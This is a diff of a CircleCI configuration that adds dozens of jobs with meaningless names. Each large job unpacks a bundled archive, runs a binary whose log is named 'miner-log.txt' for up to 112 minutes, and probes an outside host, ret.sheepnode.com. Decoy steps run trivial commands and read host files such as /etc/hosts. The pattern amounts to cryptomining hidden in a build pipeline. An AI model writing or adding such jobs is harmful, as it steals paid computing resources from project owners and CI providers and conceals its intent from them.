+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  SNAPSHOT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: LOAD THE BARCODES PRIORITY
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; y="sorting results"; echo "[${y~~}]"; true ; } > /tmp/lower/0LthpkWgTKJ
+            echo "unit yankee-1: $(wc -c </tmp/lower/0LthpkWgTKJ)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '0LthpkWgTKJ'
+  yankee-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  kbw3vj7t:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Notification risk low
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; grep -Hi local /etc/hosts; true ; } > /tmp/lower/6pe6dzzrb9x
+            echo "unit hotfix-7100: $(wc -c </tmp/lower/6pe6dzzrb9x)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '6pe6dzzrb9x'
+  hotfix-7100:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/6pe6dzzrb9x 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  model-2011:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 3
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo -n yes | tr -d 'aeiou'; true ; } > /tmp/lower/6d3aa051860
+            echo "unit spin-up: $(wc -c </tmp/lower/6d3aa051860)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '6d3aa051860'
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  navsByName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Unfold the backlog
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; ls -1 /etc/default | tr "a-z" "A-Z" | fmt -w 49; true ; } > /tmp/lower/raven-nickel-host
+            echo "unit BUILD_DEV: $(wc -c </tmp/lower/raven-nickel-host)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'raven-nickel-host'
+  BUILD_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/raven-nickel-host 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  trans-cluster:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Do not approve the depreciation schedule
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; printf '%s\0' set heap thumb cost junk|xargs -0 -n1 echo; true ; } > /tmp/lower/release-v4.18.26
+            echo "unit jun25-cleanup: $(wc -c </tmp/lower/release-v4.18.26)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'release-v4.18.26'
+  jun25-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/release-v4.18.26 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  tbd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Hold short of the blank
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; for w in $(seq 5); do echo $((w * w)); done; true ; } > /tmp/lower/SeIb8w
+            echo "unit v5-beta: $(wc -c </tmp/lower/SeIb8w)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'SeIb8w'
+  v5-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/SeIb8w 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  TYZVPL-39484a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Dryrun
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo 'fox tiger cat bear goose crow' | awk '{print $2}'; true ; } > /tmp/lower/payload-invoice
+            echo "unit dotnet8-ship: $(wc -c </tmp/lower/payload-invoice)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'payload-invoice'
+  dotnet8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/payload-invoice 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  UnboundedBoundedEdgeController:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Maintenance mode wound down automatically
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo omega raven tasks fixes | tr ' ' '\n' | awk 'length > 7'; true ; } > /tmp/lower/LOADER_QUARK_CHUNK
+            echo "unit check-staging-release-candidate: $(wc -c </tmp/lower/LOADER_QUARK_CHUNK)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'LOADER_QUARK_CHUNK'
+  check-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/LOADER_QUARK_CHUNK 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  y_val:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Onboard the probation reviews
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; touch '/var/tmp/theater.log' && rm -v '/var/tmp/theater.log'; true ; } > /tmp/lower/20171223_125141
+            echo "unit cf-v2: $(wc -c </tmp/lower/20171223_125141)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '20171223_125141'
+  cf-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/20171223_125141 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  GUI_Height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: REPAIR
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; seq 57 >"/tmp/office-0514.csv" && split -n 2 "/tmp/office-0514.csv" /tmp/tree. && wc -l /tmp/tree.*; true ; } > /tmp/lower/backUpmArKeTSHArD
+            echo "unit jun6-ship: $(wc -c </tmp/lower/backUpmArKeTSHArD)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'backUpmArKeTSHArD'
+  jun6-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/backUpmArKeTSHArD 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
